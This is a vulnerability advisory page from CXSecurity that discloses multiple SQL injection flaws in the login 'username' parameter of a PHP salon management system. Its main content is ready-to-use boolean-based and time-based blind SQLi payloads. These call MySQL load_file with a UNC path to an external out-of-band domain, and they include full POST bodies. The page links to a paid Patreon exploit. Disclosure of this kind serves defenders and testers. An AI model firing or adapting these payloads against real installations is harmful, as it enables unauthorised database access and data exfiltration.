---
title: BarbarBaba-1.0 Copyright©2025-Multiple-SQLi
url: https://cxsecurity.com/issue/WLB-2025090006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-15
fetch_date: 2025-10-02T20:09:52.941154
---

# BarbarBaba-1.0 Copyright©2025-Multiple-SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **BarbarBaba-1.0 Copyright©2025-Multiple-SQLi**  **2025.09.14**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: BarbarBaba-1.0 Copyright©2025-Multiple-SQLi
# Author: nu11secur1ty
# Date: 09/08/2025
# Vendor: https://www.mayurik.com/
# Software: https://www.sourcecodester.com/php/18171/best-salon-management-system-project-php.html
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `username` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\413rkmu8yyo9mlfim13yau00crik6b0zr2fu2kq9.tupaputka.com\\kbo'))+' was submitted in the username parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.
STATUS: HIGH-Vulnerability
[+]Payload:
- SQLi:
```SQLi
---
Parameter: username (POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: username=mayurik'+(select load\_file('\\\\413rkmu8yyo9mlfim13yau00crik6b0zr2fu2kq9.tupaputka.com\\kbo'))+'' RLIKE (SELECT (CASE WHEN (5028=5028) THEN 0x6d61797572696b+(select load\_file(0x5c5c5c5c343133726b6d753879796f396d6c66696d313379617530306372696b3662307a72326675326b71392e6f6173746966792e636f6d5c5c6b626f))+'' ELSE 0x28 END)) AND 'mNEw'='mNEw&password=rootadmin&g-recaptcha-response=mayurik&login=Sign In
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: username=mayurik'+(select load\_file('\\\\413rkmu8yyo9mlfim13yau00crik6b0zr2fu2kq9.tupaputka.com\\kbo'))+'' AND (SELECT 3336 FROM (SELECT(SLEEP(11)))cTVj) AND 'tOJm'='tOJm&password=rootadmin&g-recaptcha-response=mayurik&login=Sign In
---
```
# Reproduce:
[href](https://www.patreon.com/posts/barbarbaba-1-0-138411307)
# Buy an exploit only:
[href](https://www.patreon.com/posts/barbarbaba-1-0-138411307)
# Time spent:
01:15:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025090006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top